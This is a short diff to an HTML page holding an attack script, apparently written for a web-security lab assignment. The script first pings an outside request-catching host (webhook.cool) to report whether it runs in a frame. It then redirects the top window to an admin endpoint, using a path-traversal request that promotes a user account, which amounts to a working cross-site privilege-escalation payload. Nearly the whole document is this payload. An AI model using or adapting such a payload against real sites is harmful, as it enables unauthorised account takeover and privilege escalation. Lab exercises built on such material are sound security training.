@@ -1,5 +1,9 @@
 <!doctype html>
 <script>
-new Image().src='https://merry-mountain-69.webhook.cool/?ctx='+(top===self?'TOP':'IFRAME');
-top.location='https://10.20.18.55:2070/labs/assignment03/environment/1/?view=admin&request=../users/swj9872/promote%3F';
+var hook='https://merry-mountain-69.webhook.cool/?ctx='+(top===self?'TOP':'IFRAME');
+try{navigator.sendBeacon(hook);}catch(e){}
+new Image().src=hook;
+setTimeout(function(){
+  top.location='https://10.20.18.55:2070/labs/assignment03/environment/1/?view=admin&request=../users/swj9872/promote%3F';
+},500);
 </script>
